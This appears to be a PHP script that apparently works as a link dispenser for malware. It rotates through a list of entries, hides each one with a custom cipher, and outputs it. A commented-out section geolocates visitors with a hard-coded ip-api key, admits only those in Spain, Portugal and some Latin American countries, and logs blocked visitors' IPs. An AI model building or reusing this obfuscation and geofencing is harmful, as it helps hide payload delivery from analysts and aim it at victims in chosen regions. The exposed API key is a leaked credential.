<?php
function cryptw($s1){
$id = 13;
$sx = "";
$x = 0;
$x4 = rand(0,24);
$result = chr($x4+65);
$x4 = $x4  + $id;
    for ($i = 0; $i <= strlen($s1); $i++)
    {
        $x = ord(substr($s1,$i,1)) + $x4;
            if ($x <= 25)
            {
                $sx = "A".chr($x+65);
            } else
            {
                $x2 = (int)($x / 25);
                $x3 = $x - ($x2 * 25);
                $sx = chr($x2+65). chr($x3+65);
            }
    $result .= $sx;
    }
return $result;
}

// function getGeo( $ip ) {
//     if(strlen($ip) > 3 ) { 
//         try{
//             $cURLConnection = curl_init();
//             curl_setopt($cURLConnection, CURLOPT_URL, "https://pro.ip-api.com/json/" . $ip . "?key=nacNcSjqDSVv8If");
//             curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  
//             curl_setopt($cURLConnection, CURLOPT_CONNECTTIMEOUT, 0);
//             curl_setopt($cURLConnection, CURLOPT_TIMEOUT, 5); 
//             $phoneList = curl_exec($cURLConnection); 
//             curl_close($cURLConnection); 
                  
//             $jsonArrayResponse = json_decode($phoneList);
//             return $jsonArrayResponse; 
//         } catch (Exception $e) {
//             return false; 
//         }
//     }
//     return "";
// }
// $country = "";
// $IP = getenv("REMOTE_ADDR");
// $host = gethostbyaddr($IP);
// $localizacao = getGeo($IP);
// $country = isset($localizacao) && isset($localizacao->country) ? $localizacao->country : "-"; 
// $countryCODE = isset($localizacao) && isset($localizacao->countryCode) ? $localizacao->countryCode : "-";
// if (!(($country == "") || ($country == "Spain") || ($country == "Mexico") || ($country == "Brazil") || ($country == "Portugal") || ($country == "Argentina") || ($country == "Peru")  || ($country == "Chile") || ($country == "Colombia"))) {
// $fp = fopen("bloq/COUNTRY_".$IP . "_" .$host . "_" . $country . "_" . $user_browser . "_" . $user_os .  ".txt","wb");
// fwrite($fp, "");
// fclose($fp); 
// exit;  
// }


$arqw = "fg4gasg";
$arqext = "fdgr3";

$fp = fopen("c.txt", "r");
$count = fread($fp, 1024);
fclose($fp); 

if ($count >= 500) {$count = 0;};
 $count=472;
$count2 = $count; 
$count = $count + 1; 

$fp = fopen("c.txt", "w");
fwrite($fp, $count);
fclose($fp);

$listalinks=file("fg4gasgam");
// echo("<pre>")  ;
// //
// var_dump($listalinks)    ; die;

$sentry = $listalinks[$count2];
$sw = $sentry.$count2."#";
$sw = str_replace("\n", "", $sw);
$sw = str_replace("\r", "", $sw);
//echo $sw;

echo  cryptw($sw);
?>
